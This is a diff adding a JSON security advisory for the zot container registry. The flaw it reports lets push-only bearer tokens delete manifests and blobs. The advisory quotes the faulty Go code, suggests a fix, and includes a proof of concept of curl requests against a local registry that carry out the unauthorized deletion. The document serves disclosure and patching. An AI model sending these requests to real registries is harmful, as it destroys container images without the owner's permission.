@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-qg67-7m6v-qg25",
+  "modified": "2026-09-18T17:30:07.249630164Z",
+  "published": "2026-09-18T17:15:19Z",
+  "aliases": [
+    "CVE-2026-61833"
+  ],
+  "summary": "zot: Bearer authentication maps DELETE to push scope, allowing unauthorized deletion",
+  "details": "### Summary\n\nA bearer token with only `pull` and `push` scopes can successfully delete manifests and blobs from a zot registry. The bearer authentication handler maps all non-GET/HEAD HTTP methods, including DELETE, to the `\"push\"` action, and the `DistSpecAuthzHandler` middleware is bypassed entirely for bearer-authenticated requests. This allows any client holding a push-only bearer token to delete arbitrary manifests and blobs within the token's repository scope, in violation of the [Docker Distribution Token Authentication Specification](https://distribution.github.io/distribution/spec/auth/scope/).\n\n### Details\n\nThe vulnerability exists in two interacting components:\n\n**1. Action Mapping Collapse (`pkg/api/authn.go:571–586`)**\n\nThe bearer authentication handler maps HTTP methods to token scope actions using a binary check:\n\n```go\naction := \"pull\"\nif m := request.Method; m != http.MethodGet \u0026\u0026 m != http.MethodHead {\n    action = \"push\"\n}\n```\n\nThis collapses DELETE, PUT, PATCH, and POST into a single `\"push\"` action. The `\"delete\"` action is never assigned.\n\n**2. Authorization Bypass for Bearer Auth (`pkg/api/authz.go:270–275, 318–323`)**\n\nWhen a request is authenticated via bearer token, the `DistSpecAuthzHandler` middleware, which performs fine-grained action inference (distinguishing `create`, `read`, `update`, and `delete`) is bypassed entirely:\n\n```go\nif err != nil || (authnMwCtx != nil \u0026\u0026 authnMwCtx.AuthnType == BEARER) {\n    next.ServeHTTP(response, request)\n    return\n}\n```\n\n**3. No Handler-Level Authorization Check**\n\nNeither `DeleteManifest` (`routes.go:799–884`) nor `DeleteBlob` (`routes.go:1192–1241`) performs an independent authorization check for delete permission before executing the deletion.\n\n**Deviation from Specification and Reference Implementation**\n\nThe [[Docker Distribution Token Scope Documentation](https://distribution.github.io/distribution/spec/auth/scope/)](https://distribution.github.io/distribution/spec/auth/scope/) defines `delete` as a distinct action separate from `push`. The reference implementation ([[distribution/distribution](https://github.com/distribution/distribution/blob/main/registry/handlers/app.go)](https://github.com/distribution/distribution/blob/main/registry/handlers/app.go)) correctly maps DELETE requests to the `\"delete\"` action:\n\n```go\ncase http.MethodDelete:\n    records = append(records,\n        auth.Access{\n            Resource: resource,\n            Action:   \"delete\",\n        })\n```\n\nFurthermore, zot's own native access-control configuration explicitly distinguishes `delete` as a separate permission from `create` and `update`, confirming the project's intent that delete is a distinct authorization action.\n\n**Suggested Fix**\n\nIn `pkg/api/authn.go`, the action mapping should distinguish DELETE:\n\n```go\naction := \"pull\"\nswitch {\ncase m == http.MethodGet || m == http.MethodHead:\n    action = \"pull\"\ncase m == http.MethodDelete:\n    action = \"delete\"\ndefault:\n    action = \"push\"\n}\n```\n\nThe `DistSpecAuthzHandler` bypass for bearer-authenticated requests (`authz.go:270–275`) should also be reconsidered to ensure bearer-authenticated requests receive equivalently granular authorization checks.\n\n### PoC\n\n**Prerequisites:** zot v2.1.15 with bearer authentication enabled, and a token server issuing JWTs with `actions: [\"pull\", \"push\"]` (no `\"delete\"`).\n\n**Steps to Reproduce:**\n\n1. Configure zot with bearer authentication pointing to a token server\n2. Obtain a bearer token with scope `repository:poc-test:pull,push` (no delete)\n3. Upload a config blob:\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -X POST \"http://127.0.0.1:5001/v2/poc-test/blobs/uploads/?digest=sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a\" \\\n  -d '{}'\n# → 201 Created\n```\n4. Push a manifest tagged `v1.0` (succeeds token has push):\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/vnd.oci.image.manifest.v1+json\" \\\n  -X PUT \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\" \\\n  -d '{\"schemaVersion\":2,\"mediaType\":\"application/vnd.oci.image.manifest.v1+json\",\"config\":{\"mediaType\":\"application/vnd.oci.image.config.v1+json\",\"digest\":\"sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a\",\"size\":2},\"layers\":[]}'\n# → 201 Created\n```\n5. DELETE the manifest with the same push-only token (**should return 401, but returns 202**):\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -X DELETE \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\"\n# → 202 Accepted (VULNERABLE)\n```\n6. Confirm the manifest is gone:\n```bash\ncurl -o /dev/null -w \"%{http_code}\" -H \"Authorization: Bearer $TOKEN\" \\\n  \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\"\n# → 404 Not Found\n```\n\n**Expected behavior:** Step 5 should return `401 Unauthorized` with a `WWW-Authenticate` header requesting `scope=\"repository:poc-test:delete\"`.\n\n**Actual behavior:** Step 5 returns `202 Accepted` and the manifest is permanently deleted.\n\nA complete reproducer (minimal Go token server + zot config + automated script) is available upon request.\n\n### Impact\n\n**Privilege Escalation / Unauthorized Deletion** Any bearer token with push scope can delete manifests and blobs, even when the token was explicitly issued without delete permissions.\n\nThis is particularly impactful in CI/CD environments where automated systems are issued least-privilege tokens with only pull and push permissions. A compromised or stolen CI token which should only be able to build and push images can be used to:\n\n- Delete arbitrary manifests (tags) within any repository covered by the token's scope\n- Delete arbitrary blobs within those repositories\n- Render production container images unpullable\n- Rewrite image history by removing specific tags",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "zotregistry.dev/zot/v2",
+        "purl": "pkg:golang/zotregistry.dev/zot/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.1.18"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-qg67-7m6v-qg25/GHSA-qg67-7m6v-qg25.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/project-zot/zot/security/advisories/GHSA-qg67-7m6v-qg25"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/project-zot/zot/pull/4161"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/project-zot/zot/commit/7bb211bcd4352b90f3e99752607fbd1f050bf7ca"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/project-zot/zot"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/project-zot/zot/releases/tag/v2.1.18"
+    }
+  ]
+}
